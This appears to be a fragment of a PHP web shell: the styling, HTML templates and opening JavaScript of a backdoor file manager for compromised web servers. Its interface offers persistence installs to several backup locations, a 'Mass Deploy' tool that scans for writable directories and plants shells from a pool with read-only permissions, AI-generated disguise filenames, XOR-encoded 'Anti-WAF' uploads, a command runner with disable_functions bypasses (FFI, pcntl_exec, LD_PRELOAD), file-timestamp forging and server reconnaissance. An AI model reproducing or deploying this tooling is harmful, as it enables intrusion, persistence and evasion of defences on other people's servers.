.header{background:#161b22;border-bottom:1px solid #30363d;padding:8px 16px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:10;flex-wrap:wrap}
.header .logo{color:#58a6ff;font-weight:700;font-size:14px}.header .info{color:#8b949e;font-size:11px;flex:1}
.header button,.header a{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:4px 10px;border-radius:6px;cursor:pointer;font:inherit;font-size:11px;text-decoration:none}
.header button:hover{background:#30363d}
.path-bar{background:#0d1117;border-bottom:1px solid #21262d;padding:6px 16px;display:flex;align-items:center;gap:4px;font-size:11px;flex-wrap:wrap}
.path-bar a{color:#58a6ff;text-decoration:none}.path-bar span{color:#8b949e}
.path-bar form{display:inline-flex;gap:4px;margin-left:auto}
.path-bar input{background:#161b22;border:1px solid #30363d;color:#c9d1d9;padding:3px 8px;border-radius:4px;font:inherit;font-size:11px;width:300px}
.stats{display:flex;gap:16px;padding:6px 16px;background:#161b22;font-size:11px;color:#8b949e;border-bottom:1px solid #21262d;flex-wrap:wrap}
.stats b{color:#c9d1d9}
.file-list{padding:0}
.file-row{display:grid;grid-template-columns:28px 1fr 90px 120px 60px 100px;align-items:center;padding:6px 16px;border-bottom:1px solid #21262d;font-size:12px}
.file-row:hover{background:#161b22}.file-row .icon{font-size:14px;text-align:center}
.file-row .name a{color:#c9d1d9;text-decoration:none}.file-row .name a:hover{color:#58a6ff}
.file-row .size{color:#8b949e;text-align:right}.file-row .date{color:#8b949e;font-size:11px}.file-row .perm{color:#484f58;font-size:10px}
.file-row .actions{display:flex;gap:4px;justify-content:flex-end}
.file-row .actions a{color:#8b949e;text-decoration:none;font-size:11px;padding:2px 6px;border-radius:3px}
.file-row .actions a:hover{background:#21262d;color:#f85149}
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.7);z-index:100;align-items:center;justify-content:center}
.modal.active{display:flex}
.modal-box{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;max-width:92%;max-height:90vh;overflow:auto;width:500px}
.modal-box.wide{width:950px}
.modal-box h3{color:#58a6ff;margin-bottom:12px}
.modal-box input,.modal-box textarea,.modal-box select{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px;border-radius:4px;font:inherit;margin:4px 0}
.modal-box textarea{height:120px;font-size:11px}
.modal-box button{background:#238636;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;margin-top:8px}
.modal-box button.danger{background:#da3633}
.preview{background:#0d1117;padding:20px;margin:16px;border-radius:8px;border:1px solid #30363d}
.preview h3{color:#58a6ff;margin-bottom:12px}
.preview textarea{width:100%;height:400px;background:#161b22;border:1px solid #30363d;color:#c9d1d9;padding:12px;font:13px/1.6 monospace;resize:vertical;box-sizing:border-box}
.status-msg{margin-top:10px;padding:8px;background:#0d1117;border-radius:4px;color:#58a6ff;font-size:12px;display:none}
.clickable{cursor:pointer}.clickable:hover{color:#58a6ff;text-decoration:underline}
.perm-btn{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:11px;margin-right:4px}
.hint{color:#8b949e;font-size:11px;margin-bottom:8px}
.info-tabs{display:flex;gap:4px;margin-bottom:16px;border-bottom:1px solid #30363d;padding-bottom:8px;flex-wrap:wrap}
.info-tab{background:#21262d;color:#8b949e;border:1px solid #30363d;padding:6px 14px;border-radius:6px 6px 0 0;cursor:pointer;font-size:12px}
.info-tab.active{background:#0d1117;color:#58a6ff;border-color:#58a6ff;border-bottom-color:#0d1117}
.info-panel{display:none}.info-panel.active{display:block}
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.info-card{background:#0d1117;border:1px solid #21262d;border-radius:6px;padding:12px}
.info-card h4{color:#58a6ff;font-size:11px;text-transform:uppercase;margin-bottom:8px}
.info-item{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #161b22;font-size:11px}
.info-item:last-child{border-bottom:none}.info-item .label{color:#8b949e}
.info-item .value{color:#c9d1d9;text-align:right;max-width:60%;word-break:break-all}
.info-item .value.success{color:#3fb950}.info-item .value.danger{color:#f85149}.info-item .value.warning{color:#d29922}
.progress-bar{height:6px;background:#21262d;border-radius:3px;overflow:hidden;margin-top:6px}
.progress-fill{height:100%;border-radius:3px}.progress-fill.green{background:#3fb950}.progress-fill.yellow{background:#d29922}.progress-fill.red{background:#f85149}
.ext-list{max-height:100px;overflow-y:auto;font-size:10px;color:#8b949e;line-height:1.8}
.ext-list span{background:#21262d;padding:1px 5px;border-radius:3px;margin:1px;display:inline-block}
.section-box{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:14px;margin-bottom:14px}
.section-title{color:#58a6ff;font-size:12px;font-weight:bold;margin-bottom:10px;text-transform:uppercase;letter-spacing:1px}
.tebar-row{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:12px;margin-bottom:10px}
.tebar-row .row-header{display:grid;grid-template-columns:1fr 220px auto;gap:8px;margin-bottom:8px}
.tebar-row .row-footer{display:grid;grid-template-columns:100px 1fr auto auto auto;gap:8px;margin-top:8px;align-items:center}
.src-mode-selector{display:flex;gap:10px;background:#0d1117;padding:6px 10px;border-radius:4px;margin-bottom:8px;flex-wrap:wrap}
.src-mode-selector label{display:flex;align-items:center;gap:4px;font-size:11px;cursor:pointer;color:#8b949e}
.src-mode-selector input[type="radio"]{accent-color:#58a6ff;margin:0}
.tebar-row .src-input{display:none}.tebar-row .src-input.active{display:block}
.remove-row-btn{background:#da3633;color:#fff;border:none;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:11px}
.scan-result{background:#0d1117;border:1px solid #30363d;border-radius:4px;margin:4px 0;font-size:11px;overflow:hidden}
.scan-result.writable{border-color:#3fb950;color:#3fb950}
.scan-result-header{display:flex;justify-content:space-between;align-items:center;padding:8px;cursor:pointer}
.scan-result-header:hover{background:#161b22}
.scan-result-header .arrow{transition:transform .3s;font-size:10px}
.scan-result-header.expanded .arrow{transform:rotate(90deg)}
.file-drop{max-height:0;opacity:0;overflow:hidden;transition:max-height .4s ease,opacity .3s ease;padding:0 8px;background:#0a0e14}
.file-drop.expanded{max-height:300px;opacity:1;overflow-y:auto;padding:8px;border-top:1px solid #21262d}
.file-drop-item{display:grid;grid-template-columns:22px 24px minmax(140px,1fr) 80px 50px;align-items:center;gap:8px;padding:4px 8px;font-size:11px;color:#c9d1d9;border-radius:3px}
.file-drop-item:hover{background:#161b22}
.file-drop-item .fd-check{accent-color:#3fb950;width:14px;height:14px;cursor:pointer;margin:0}
.file-drop-item .fd-icon{width:22px;text-align:center}
.file-drop-item .fd-name{color:#c9d1d9;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:0;font-weight:600}
.file-drop-item .fd-size{color:#8b949e;text-align:right;font-size:10px}
.file-drop-item .fd-perm{color:#484f58;text-align:right;font-size:10px}
.file-drop-loading,.file-drop-empty{padding:12px;text-align:center;color:#8b949e;font-size:11px}
.scan-btn-group{display:flex;gap:8px;margin-bottom:12px}.scan-btn-group button{flex:1}
.result-link{color:#58a6ff;text-decoration:none;word-break:break-all;font-size:11px}
.ai-config{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
.ai-config .full-width{grid-column:1/-1}
.ai-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
.ai-actions button{font-size:11px;padding:6px 12px}
.ai-status{font-size:11px;margin-top:8px;padding:6px 10px;background:#0d1117;border-radius:4px;display:none}
.ai-status.error{color:#f85149}.ai-status.success{color:#3fb950}.ai-status.loading{color:#d29922}
.ai-suggestions{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px;max-height:120px;overflow-y:auto}
.ai-suggestion{background:#21262d;color:#c9d1d9;padding:3px 8px;border-radius:3px;font-size:11px;cursor:pointer;border:1px solid #30363d}
.tab-btn{background:#21262d;color:#8b949e;border:1px solid #30363d;padding:8px 16px;border-radius:6px 6px 0 0;cursor:pointer;font-size:12px;font-weight:bold}
.tab-btn.active{background:#0d1117;color:#58a6ff;border-bottom-color:#0d1117}
.tab-content{display:none}.tab-content.active{display:block}
.pool-item{display:flex;align-items:center;gap:8px;background:#161b22;border:1px solid #30363d;border-radius:4px;padding:8px;margin-bottom:6px;font-size:11px}
.pool-item .pool-name{flex:1;color:#c9d1d9}.pool-item .pool-size{color:#8b949e}
.pool-item button{background:none;border:none;color:#f85149;cursor:pointer;font-size:13px}
.ref-chip{display:inline-block;background:#21262d;color:#d29922;padding:3px 8px;border-radius:3px;font-size:10px;margin:2px;border:1px solid #d29922;cursor:pointer}
.sync-btn{background:#1f6feb;color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px;white-space:nowrap}
.ref-btn{background:#d29922;color:#0d1117;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px;white-space:nowrap}
.bulk-assign{background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:10px;margin-top:10px}
.bulk-assign select{width:auto;min-width:200px}
.cleanup-btn{background:#da3633;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-size:12px;margin-top:10px}
.cleanup-btn:hover{background:#f85149}
.bypass-toggle{display:flex;align-items:center;gap:8px;margin-bottom:10px}
.bypass-toggle input{accent-color:#d29922}
.bypass-toggle label{font-size:11px;color:#d29922}
</style></head><body>
<div class="header">
<div class="logo">🗂 FM</div>
<div class="info"><?=$serverInfo?></div>
<a href="?onlygweh&_install" onclick="return confirm('Install to 6 backup locations?')">💾 Install</a>
<button onclick="showModal('upload')">📤 Upload</button>
<button onclick="showModal('newfile')">📄 New</button>
<button onclick="showModal('mkdir')">📁 Dir</button>
<button onclick="showModal('tebar')" style="background:#d29922;border-color:#d29922">🚀 Mass Deploy</button>
<button onclick="showModal('cmd')">💻 Shell</button>
<button onclick="showModal('info')" style="background:#1f6feb;border-color:#1f6feb">📊 Info</button>
<a href="?onlygweh&p=<?=_u($P)?>" title="Reload">🔄</a>
<a href="?onlygweh&logout" onclick="return confirm('Logout?')" style="color:#f85149">🚪</a>
</div>
<div class="path-bar">
<?php
$parts=explode('/',$P);$build='';
foreach($parts as $i=>$part){
if($part===''&&$i===0){echo '<a href="?onlygweh&p='._u('/').'">/</a>';continue;}
if($part==='')continue;
$build.='/'.$part;
echo '<span>/</span><a href="?onlygweh&p='._u($build).'">'.htmlspecialchars($part).'</a>';
}
?>
<form method="get"><input name="p" placeholder="Jump to path..." value="<?=htmlspecialchars($P)?>"><input type="hidden" name="onlygweh" value="1"></form>
</div>
<div class="stats">
<span>📁 <b><?=count($items)?></b> items</span>
<span>💾 <b><?=number_format((float)$totalSize)?></b> B</span>
<span>🆓 <b><?=number_format($diskFree/1048576,1)?></b> MB free / <b><?=number_format($diskTotal/1048576,1)?></b> MB</span>
</div>
<?php if(!empty($tebar_results)):?>
<div class="preview"><h3>🚀 Mass Deploy Results</h3><div style="max-height:300px;overflow-y:auto">
<?php $sC=0;$fC=0;foreach($tebar_results as $r){if($r['status']==='success'){$sC++;}else{$fC++;}}?>
<div style="margin-bottom:10px;font-size:12px"><span style="color:#3fb950">✅ <?=$sC?> success</span> | <span style="color:#f85149">❌ <?=$fC?> failed</span></div>
<?php foreach($tebar_results as $r):?>
<div class="scan-result <?=($r['status']==='success'?'writable':'')?>"><div class="scan-result-header"><div>
<?php if($r['status']==='success'):?>✅ <b><?=htmlspecialchars($r['filename'])?></b> → <span style="font-size:10px;color:#8b949e"><?=isset($r['source'])?htmlspecialchars($r['source']):''?></span><br><a href="<?=htmlspecialchars($r['link'])?>" target="_blank" class="result-link"><?=htmlspecialchars($r['link'])?></a>
<?php else:?>❌ <b><?=htmlspecialchars($r['filename'])?></b> → <?=htmlspecialchars($r['path'])?> | <span style="color:#f85149"><?=htmlspecialchars($r['error'])?></span>
<?php endif;?></div></div></div>
<?php endforeach;?></div></div>
<?php endif;?>
<?php if($A=='ed'&&$editFile!==null):?>
<div class="preview"><h3>✏️ Editing: <?=htmlspecialchars($editFile)?></h3>
<form method="post" action="?onlygweh&a=sv" id="editForm">
<input type="hidden" name="file" value="<?=htmlspecialchars($editFile)?>">
<input type="hidden" name="p" value="<?=htmlspecialchars(dirname($editFile))?>">
<input type="hidden" name="enc" id="enc">
<textarea name="content" id="editor"><?=$content?></textarea>
<div style="margin-top:8px;display:flex;gap:8px">
<button type="button" onclick="saveEditEncrypted()">💾 Save (Anti-WAF)</button>
<button type="button" class="danger" onclick="location='?onlygweh&p=<?=_u(dirname($editFile))?>'">❌ Cancel</button>
</div></form></div>
<?php endif;?>
<?php if($cmdOut!==''):?>
<div class="preview"><h3>💻 Output</h3><pre style="background:#161b22;padding:12px;border-radius:4px;max-height:400px;overflow:auto;font-size:11px;white-space:pre-wrap;color:#3fb950;border:1px solid #30363d"><?=htmlspecialchars($cmdOut)?></pre></div>
<?php endif;?>
<div class="file-list">
<?php foreach($items as $item):
$icon='📄';
if($item['dir']){$icon='📁';}
elseif($item['ext']=='php'){$icon='🐘';}
elseif($item['ext']=='js'){$icon='📜';}
elseif($item['ext']=='css'){$icon='🎨';}
elseif($item['ext']=='txt'){$icon='📄';}
elseif(in_array($item['ext'],array('jpg','png','gif','svg','ico'))){$icon='🖼';}
elseif(in_array($item['ext'],array('zip','tar','gz'))){$icon='📦';}
?>
<div class="file-row">
<span class="icon"><?=$icon?></span>
<span class="name">
<?php if($item['dir']):?>
<a href="?onlygweh&p=<?=_u($item['path'])?>"><?=htmlspecialchars($item['name'])?>/</a>
<a href="#" onclick="openPathWindow('<?=_u($item['path'])?>');return false;" title="Open in popup" style="margin-left:4px;font-size:10px">🪟</a>
<?php else:?><a href="?onlygweh&a=ed&f=<?=_u($item['path'])?>&p=<?=_u($P)?>"><?=htmlspecialchars($item['name'])?></a><?php endif;?>
</span>
<span class="size"><?=$item['dir']?'&lt;DIR&gt;':number_format((float)$item['size'])?></span>
<?php if($item['time']!==''):?>
<span class="date clickable" onclick="datetimePrompt('<?=htmlspecialchars($item['path'],ENT_QUOTES)?>','<?=date('Y-m-d\TH:i',(int)$item['mtime'])?>')" title="Edit datetime"><?=$item['time']?></span>
<span class="perm clickable" onclick="chmodPrompt('<?=htmlspecialchars($item['path'],ENT_QUOTES)?>','<?=$item['perm']?>')" title="Edit chmod"><?=$item['perm']?></span>
<?php else:?><span class="date"></span><span class="perm"></span><?php endif;?>
<span class="actions">
<?php if(!$item['dir']):?><a href="?onlygweh&a=dl&f=<?=_u($item['path'])?>" title="Download">⬇</a><?php endif;?>
<?php if(!$item['dir']&&$item['ext']==='zip'):?><a href="?onlygweh&a=uz&f=<?=_u($item['path'])?>" title="Extract ZIP" onclick="return confirm('Extract?')">🗜️</a><?php endif;?>
<a href="?onlygweh&a=rm&f=<?=_u($item['path'])?>" title="Delete" onclick="return confirm('Hapus?')">🗑</a>
<a href="#" onclick="renamePrompt('<?=htmlspecialchars($item['name'])?>')" title="Rename">✏️</a>
</span></div>
<?php endforeach;?>
</div>
<div id="modal-tebar" class="modal"><div class="modal-box wide">
<h3>🚀 Mass Deploy (Scan + AI + Deploy)</h3>
<div style="display:flex;gap:4px;margin-bottom:12px;border-bottom:1px solid #30363d;padding-bottom:8px;flex-wrap:wrap">
<button class="tab-btn active" onclick="switchTebarTab('scan',this)">🔍 1. Scan</button>
<button class="tab-btn" onclick="switchTebarTab('ai',this)">🤖 2. AI</button>
<button class="tab-btn" onclick="switchTebarTab('deploy',this)">🚀 3. Deploy</button>
<button class="tab-btn" onclick="switchTebarTab('cleanup',this)">🧹 4. Cleanup</button>
</div>
<div id="tab-scan" class="tab-content active"><div class="section-box">
<div class="section-title">🔍 Scan Writable + File References</div>
<input type="text" id="scanPath" placeholder="Base path" value="<?=htmlspecialchars($P)?>">
<div class="scan-btn-group" style="margin-top:8px">
<button type="button" onclick="runScan('fast')" style="background:#3fb950">⚡ Fast</button>
<button type="button" onclick="runScan('normal')" style="background:#58a6ff">🔍 Normal</button>
<button type="button" onclick="runScan('waf')" style="background:#d29922">🛡️ WAF Bypass</button>
</div>
<div id="scanStatus" class="status-msg"></div>
<div id="scanResults" style="max-height:350px;overflow-y:auto;margin-top:12px"></div>
<div class="bulk-assign">
<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
<span style="font-size:11px;color:#8b949e">Assign shell to selected:</span>
<select id="bulkShellSelect" style="background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:4px 8px;border-radius:4px;font-size:11px"></select>
<button type="button" onclick="bulkAssignShell()" style="background:#1f6feb;color:#fff;border:none;padding:4px 12px;border-radius:4px;cursor:pointer;font-size:11px">⚡ Apply</button>
</div>
</div>
<div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap">
<button type="button" onclick="selectAllScans()" style="background:#21262d">☑ Select All Paths</button>
<button type="button" onclick="sendSelectedToTebar()" style="background:#3fb950">➡️ Send to Deploy (<span id="selectedCount">0</span> paths, <span id="refCount">0</span> refs)</button>
</div></div></div>
<div id="tab-ai" class="tab-content"><div class="section-box">
<div class="section-title">🤖 AI Provider Configuration</div>
<div class="ai-config">
<div class="full-width"><label style="font-size:10px;color:#8b949e">HOST</label><input type="text" id="ai_host" value="https://integrate.api.nvidia.com/v1/chat/completions"></div>
<div><label style="font-size:10px;color:#8b949e">API KEY</label><input type="password" id="ai_api_key" placeholder="nvapi-xxx"></div>
<div><label style="font-size:10px;color:#8b949e">MODEL</label><input type="text" id="ai_model" value="moonshotai/kimi-k3"></div>
</div>
<div style="display:flex;gap:6px;margin-bottom:10px">
<button type="button" onclick="saveAiConfig()" style="background:#1f6feb;font-size:11px">💾 Save</button>
<button type="button" onclick="loadAiConfig()" style="background:#21262d;font-size:11px">📥 Load</button>
<button type="button" onclick="clearAiConfig()" style="background:#da3633;font-size:11px">🗑 Clear</button>
</div>
<div class="ai-actions">
<button type="button" onclick="aiGenerate('filename')" style="background:#238636">🤖 Generate Names</button>
<button type="button" onclick="aiGenerate('description')" style="background:#1f6feb">🤖 Description</button>
<button type="button" onclick="showModal('ai-custom')" style="background:#d29922">💬 Custom</button>
</div>
<div id="aiStatus" class="ai-status"></div>
<div id="aiSuggestions" class="ai-suggestions"></div>
</div></div>
<div id="tab-deploy" class="tab-content">
<div class="section-box">
<div class="section-title">📦 Shell Pool (Upload Multiple)</div>
<div id="poolFiles"></div>
<div style="display:flex;gap:8px;margin-top:8px">
<input type="file" id="poolFileInput" accept=".php,.phtml,.php5,.php7,.txt" multiple style="display:none" onchange="addPoolFiles(this)">
<button type="button" onclick="document.getElementById('poolFileInput').click()" style="background:#1f6feb">➕ Add Shell to Pool</button>
<button type="button" onclick="addPoolTextarea()" style="background:#21262d">📋 Paste Shell</button>
</div></div>
<div class="section-box" id="refSection" style="display:none">
<div class="section-title">🏷️ File References (buat nama)</div>
<div id="refChips"></div>
</div>
<div class="section-box">
<div class="section-title">🚀 Deployment Rows (default chmod 0444)</div>
<div id="tebarRows"></div>
<div style="margin:12px 0"><button type="button" onclick="addTebarRow()" style="background:#1f6feb">+ Add Row</button></div>
<button type="button" onclick="submitTebar()" style="background:#d29922;padding:10px 20px;font-size:13px;width:100%">🚀 Deploy All</button>
<div id="tebarStatus" class="status-msg"></div>
</div></div>
<div id="tab-cleanup" class="tab-content"><div class="section-box">
<div class="section-title">🧹 Cleanup Deployed Shells</div>
<p class="hint">💡 Hapus shell-shell yang sudah di-deploy sebelumnya (data tersimpan di browser localStorage).</p>
<div id="cleanupList" style="max-height:300px;overflow-y:auto;margin-top:10px"></div>
<div style="margin-top:10px;display:flex;gap:8px">
<button type="button" onclick="loadCleanupList()" style="background:#1f6feb">🔄 Refresh List</button>
<button type="button" onclick="cleanupAllDeployed()" class="cleanup-btn">🗑️ Cleanup All</button>
</div>
<div id="cleanupStatus" class="status-msg"></div>
</div></div>
<div style="margin-top:12px;text-align:right"><button type="button" class="danger" onclick="hideModal('tebar')">Close</button></div>
</div></div>
<div id="modal-upload" class="modal"><div class="modal-box">
<h3>📤 Upload File (Anti-WAF)</h3>
<p class="hint">💡 ≤20MB single-post XOR. Gagal? otomatis fallback chunked retry-safe.</p>
<input type="file" id="up-file"><div id="up-status" class="status-msg"></div>
<button type="button" onclick="handleFileUpload()">🚀 Upload</button>
<button type="button" class="danger" onclick="hideModal('upload')">Cancel</button>
</div></div>
<div id="modal-newfile" class="modal"><div class="modal-box">
<h3>📄 New File</h3>
<form method="post" action="?onlygweh&a=nf&p=<?=_u($P)?>"><input name="fname" placeholder="contoh: shell.php" required><button type="submit">Create</button><button type="button" class="danger" onclick="hideModal('newfile')">Cancel</button></form>
</div></div>
<div id="modal-mkdir" class="modal"><div class="modal-box">
<h3>📁 New Directory</h3>
<form method="post" action="?onlygweh&a=mk&p=<?=_u($P)?>"><input name="dir" placeholder="Directory name" required><button type="submit">Create</button><button type="button" class="danger" onclick="hideModal('mkdir')">Cancel</button></form>
</div></div>
<div id="modal-chmod" class="modal"><div class="modal-box">
<h3>🔐 Edit Permission</h3><p class="hint" id="chmod-path" style="word-break:break-all"></p>
<form method="post" action="?onlygweh&a=chmod"><input type="hidden" name="target" id="chmod-target"><input type="hidden" name="p" value="<?=htmlspecialchars($P)?>">
<div style="margin:8px 0"><button type="button" class="perm-btn" onclick="setPerm('0755')">755</button><button type="button" class="perm-btn" onclick="setPerm('0644')">644</button><button type="button" class="perm-btn" onclick="setPerm('0777')">777</button><button type="button" class="perm-btn" onclick="setPerm('0444')">444</button></div>
<input name="perm" id="chmod-perm" placeholder="0755" required><button type="submit">Apply</button><button type="button" class="danger" onclick="hideModal('chmod')">Cancel</button></form>
</div></div>
<div id="modal-datetime" class="modal"><div class="modal-box">
<h3>🕐 Edit Datetime</h3><p class="hint" id="datetime-path" style="word-break:break-all"></p>
<form method="post" action="?onlygweh&a=touch"><input type="hidden" name="target" id="datetime-target"><input type="hidden" name="p" value="<?=htmlspecialchars($P)?>">
<input type="datetime-local" name="datetime" id="datetime-val" required><button type="submit">Apply</button><button type="button" class="danger" onclick="hideModal('datetime')">Cancel</button></form>
</div></div>
<div id="modal-cmd" class="modal"><div class="modal-box wide">
<h3>💻 Shell Command (7 fallback + Bypass Mode)</h3>
<div class="bypass-toggle">
<input type="checkbox" id="bypassMode" onchange="toggleBypassMode()">
<label for="bypassMode">🛡️ Enable Bypass Mode (FFI, pcntl_exec, LD_PRELOAD, etc)</label>
</div>
<form method="post" action="?onlygweh&a=cmd&p=<?=_u($P)?>" id="cmdForm">
<input type="hidden" name="bypass_mode" id="bypassModeHidden" value="0">
<input name="cmd" placeholder="whoami; ls -la; id" style="width:100%"><button type="submit" style="background:#1f6feb">▶ Execute</button><button type="button" class="danger" onclick="hideModal('cmd')">Close</button></form>
<?php if($cmdOut!==''):?><pre style="margin-top:12px;background:#0d1117;padding:12px;border-radius:4px;max-height:400px;overflow:auto;font-size:11px;white-space:pre-wrap;color:#3fb950;border:1px solid #30363d"><?=htmlspecialchars($cmdOut)?></pre><?php endif;?>
</div></div>
<div id="modal-rename" class="modal"><div class="modal-box">
<h3>✏️ Rename</h3>
<form method="post" action="?onlygweh&a=mv&p=<?=_u($P)?>"><input name="old" id="rename-old" type="hidden"><input name="new" id="rename-new" placeholder="New name" required><button type="submit">Rename</button><button type="button" class="danger" onclick="hideModal('rename')">Cancel</button></form>
</div></div>
<div id="modal-info" class="modal"><div class="modal-box wide">
<h3>📊 Web & Server Information</h3>
<div class="info-tabs">
<button class="info-tab active" onclick="switchInfoTab('server',this)">🖥 Server</button>
<button class="info-tab" onclick="switchInfoTab('php',this)">🐘 PHP</button>
<button class="info-tab" onclick="switchInfoTab('network',this)">🌐 Network</button>
<button class="info-tab" onclick="switchInfoTab('security',this)">🔒 Security</button>
</div>
<div id="panel-server" class="info-panel active"><div class="info-grid">
<div class="info-card"><h4>🖥 System</h4>
<div class="info-item"><span class="label">Hostname</span><span class="value"><?=$serverData['hostname']?></span></div>
<div class="info-item"><span class="label">OS</span><span class="value"><?=$serverData['os']?></span></div>
<div class="info-item"><span class="label">Arch</span><span class="value"><?=$serverData['arch']?></span></div>
<div class="info-item"><span class="label">Uptime</span><span class="value success"><?=$serverData['uptime']?></span></div>
<div class="info-item"><span class="label">Server Time</span><span class="value"><?=$serverData['server_time']?></span></div>
<div class="info-item"><span class="label">Timezone</span><span class="value"><?=$serverData['timezone']?></span></div></div>
<div class="info-card"><h4>⚙ Web Server</h4>
<div class="info-item"><span class="label">Software</span><span class="value"><?=$serverData['server_software']?></span></div>
<div class="info-item"><span class="label">Server IP</span><span class="value"><?=$serverData['server_ip']?>:<?=$serverData['server_port']?></span></div>
<div class="info-item"><span class="label">Doc Root</span><span class="value" style="font-size:10px"><?=$serverData['document_root']?></span></div>
<div class="info-item"><span class="label">Current User</span><span class="value"><?=$serverData['current_user']?></span></div>
<div class="info-item"><span class="label">PHP User</span><span class="value"><?=$serverData['php_user']?></span></div>
<div class="info-item"><span class="label">HTTPS</span><span class="value"><?=$serverData['https']?></span></div></div>
<div class="info-card" style="grid-column:1/-1"><h4>💾 Disk Usage</h4>
<div class="info-item"><span class="label">Storage</span><span class="value"><?=number_format((float)$serverData['disk_used']/1073741824,2)?> / <?=number_format((float)$serverData['disk_total']/1073741824,2)?> GB (<?=$serverData['disk_percent']?>%)</span></div>
<div class="progress-bar"><div class="progress-fill <?=$serverData['disk_percent']<70?'green':($serverData['disk_percent']<90?'yellow':'red')?>" style="width:<?=$serverData['disk_percent']?>%"></div></div></div>
</div></div>
<div id="panel-php" class="info-panel"><div class="info-grid">
<div class="info-card"><h4>🐘 PHP Core</h4>
<div class="info-item"><span class="label">PHP Version</span><span class="value success"><?=$serverData['php_version']?></span></div>
<div class="info-item"><span class="label">Zend</span><span class="value"><?=$serverData['zend_version']?></span></div>
<div class="info-item"><span class="label">SAPI</span><span class="value"><?=$serverData['sapi']?></span></div>
<div class="info-item"><span class="label">Memory Limit</span><span class="value"><?=$serverData['memory_limit']?></span></div>
<div class="info-item"><span class="label">Max Execution</span><span class="value"><?=$serverData['max_execution']?></span></div></div>
<div class="info-card"><h4>📤 Limits</h4>
<div class="info-item"><span class="label">Upload Max</span><span class="value warning"><?=$serverData['upload_max']?></span></div>
<div class="info-item"><span class="label">Post Max</span><span class="value warning"><?=$serverData['post_max']?></span></div>
<div class="info-item"><span class="label">Open Basedir</span><span class="value"><?=$serverData['open_basedir']?></span></div>
<div class="info-item"><span class="label">Safe Mode</span><span class="value"><?=$serverData['safe_mode']?></span></div></div>
<div class="info-card" style="grid-column:1/-1"><h4>📦 Extensions (<?=count(get_loaded_extensions())?>)</h4>
<div class="ext-list"><?php foreach(get_loaded_extensions() as $ext):?><span><?=$ext?></span><?php endforeach;?></div></div>
</div></div>
<div id="panel-network" class="info-panel"><div class="info-grid">
<div class="info-card"><h4>🌐 Client</h4>
<div class="info-item"><span class="label">Your IP</span><span class="value success"><?=$serverData['client_ip']?></span></div>
<div class="info-item"><span class="label">Real IP</span><span class="value"><?=$serverData['real_ip']?></span></div>
<div class="info-item"><span class="label">Cloudflare</span><span class="value warning"><?=$serverData['cloudflare']?></span></div></div>
<div class="info-card"><h4>🔍 Request</h4>
<div class="info-item"><span class="label">User Agent</span><span class="value" style="font-size:9px;max-width:100%"><?=$serverData['user_agent']?></span></div></div>
</div></div>
<div id="panel-security" class="info-panel">
<div class="info-card" style="grid-column:1/-1"><h4>🚫 Disabled Functions</h4>
<?php if($serverData['disable_functions']==='NONE'):?><div class="info-item"><span class="value success">✅ FULL ACCESS</span></div>
<?php else:?><div class="ext-list" style="max-height:150px"><?php foreach(explode(',',$serverData['disable_functions']) as $f):?><span style="background:#2f1a1a;color:#f85149"><?=trim($f)?></span><?php endforeach;?></div><?php endif;?></div>
<div class="info-card" style="grid-column:1/-1"><h4>🚫 Disabled Classes</h4>
<?php if($serverData['disable_classes']==='NONE'):?><div class="info-item"><span class="value success">✅ No disabled classes</span></div>
<?php else:?><div class="ext-list"><?php foreach(explode(',',$serverData['disable_classes']) as $c):?><span style="background:#2f1a1a;color:#f85149"><?=trim($c)?></span><?php endforeach;?></div><?php endif;?></div>
</div>
<button type="button" class="danger" onclick="hideModal('info')">Close</button>
</div></div>
<div id="modal-ai-custom" class="modal"><div class="modal-box">
<h3>💬 Custom AI Prompt</h3>
<textarea id="ai_custom_prompt" placeholder="Tulis prompt..." style="height:150px"></textarea>
<div id="aiCustomStatus" class="ai-status"></div><div id="aiCustomSuggestions" class="ai-suggestions"></div>
<div style="display:flex;gap:8px;margin-top:10px">
<button type="button" onclick="submitCustomPrompt()" style="background:#238636">🤖 Generate</button>
<button type="button" class="danger" onclick="hideModal('ai-custom')">Close</button></div>
</div></div>
<script>
var currentPath=<?=json_encode($P)?>;
var scanResultsCache=[],selectedScans={},selectedRefFiles={},refNames=[],shellPool=[],expandedPaths={},tebarRowCounter=0;
var deployedFiles=[];
// Load deployed files from localStorage
try{var saved=localStorage.getItem('fm_deployed_files');if(saved)deployedFiles=JSON.parse(saved);}catch(e){deployedFiles=[];}
function showModal(id){document.getElementById('modal-'+id).classList.add('active')}
function hideModal(id){document.getElementById('modal-'+id).classList.remove('active')}
function renamePrompt(n){document.getElementById('rename-old').value=n;document.getElementById('rename-new').value=n;showModal('rename')}
function escAttr(s){return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;')}
function switchInfoTab(t,b){var tabs=document.querySelectorAll('.info-tab'),p=document.querySelectorAll('.info-panel'),i;for(i=0;i<tabs.length;i++){tabs[i].classList.remove('active');}for(i=0;i<p.length;i++){p[i].classList.remove('active');}document.getElementById('panel-'+t).classList.add('active');if(b){b.classList.add('active');}}
